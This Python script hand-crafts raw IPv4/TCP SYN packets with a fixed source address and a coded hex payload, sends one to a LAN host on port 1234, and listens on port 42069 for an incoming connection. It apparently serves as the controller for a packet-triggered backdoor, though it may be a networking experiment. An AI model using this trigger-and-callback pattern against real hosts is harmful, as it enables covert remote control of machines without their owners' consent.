#!/bin/python3

import os
import random
import socket
import struct
import sys
import time
import threading


class IP_Header:
    def __init__(self, saddr, daddr):
        self.version = 4
        self.ihl = 5
        self.tos = 0
        self.tot_len = 0
        self.id = random.randint(1, 255)
        self.frag_off = 0
        self.ttl = 255
        self.proto = socket.IPPROTO_TCP
        self.check = 0
        self.saddr = socket.inet_aton(saddr)
        self.daddr = socket.inet_aton(daddr)

    def raw_header(self):
        return struct.pack("!BBHHHBBH4s4s", (self.version << 4) + self.ihl, self.tos, self.tot_len, self.id, self.frag_off, self.ttl, self.proto, self.check, self.saddr, self.daddr)


class TCP_Header:
    def __init__(self):
        self.src = 7575
        self.dst = 1234
        self.seq = 3373931216
        self.ack_seq = 0
        self.doff = 5
        self.fin = 0
        self.syn = 1
        self.rst = 0
        self.push = 0
        self.ack = 0
        self.urg = 0
        self.window = socket.htons(5840)
        self.check = 0
        self.urg_ptr = 0

    def raw_header(self):
        offset_res = (self.doff << 4) + 0
        flags = self.fin + (self.syn << 1) + (self.rst << 2) + (self.push <<3) + (self.ack << 4) + (self.urg << 5)
        return struct.pack("!HHLLBBHHH", self.src, self.dst, self.seq, self.ack_seq, offset_res, flags, self.window, self.check, self.urg_ptr)

    def generate_packet(self, iphdr, payload):
        payload = bytes(payload, 'ascii')
        src_addr = iphdr.saddr
        dst_addr = iphdr.daddr
        placeholder = 0
        protocol = iphdr.proto
        tcp_len = len(self.raw_header()) + len(payload)

        psh = struct.pack('!4s4sBBH' , src_addr , dst_addr , placeholder , protocol , tcp_len)
        psh = psh + self.raw_header() + payload
        tcp_check = checksum(psh)

        offset_res = (self.doff << 4) + 0
        flags = self.fin + (self.syn << 1) + (self.rst << 2) + (self.push <<3) + (self.ack << 4) + (self.urg << 5)
        tcphdr = struct.pack("!HHLLBBH", self.src, self.dst, self.seq, self.ack_seq, offset_res, flags, self.window) + struct.pack("H", tcp_check) + struct.pack("H", self.urg_ptr)

        return iphdr.raw_header() + tcphdr + payload


def checksum(msg):
    s = 0

    # loop taking 2 characters at a time
    for i in range(0, len(msg), 2):
        w = msg[i] + (msg[i+1] << 8 )
        s = s + w

    s = (s >> 16) + (s & 0xffff);
    s = s + (s >> 16);

    #complement and mask to 4 byte short
    s = ~s & 0xffff

    return s


def server_thread():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("0.0.0.0", 42069))
    sock.listen(1)

    while True:
        print("waiting on connection")
        connection, client_address = sock.accept()
        print("client connected", client_address)

        while True:
            data = connection.recv(16)
            if data:
                print(data)

            else:
                connection.close()
                break


def command_thread():
    payload = "1811181911220716594604153600170f"

    iphdr = IP_Header("192.168.1.147", "192.168.0.21");
    tcphdr = TCP_Header();
    packet = tcphdr.generate_packet(iphdr, payload)

    time.sleep(1)

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    print("sending packet")
    sock.sendto(packet, ("192.168.0.21", 0))
    sock.close()


srv_worker = threading.Thread(target=server_thread)
cmd_worker = threading.Thread(target=command_thread)

srv_worker.start()
cmd_worker.start()
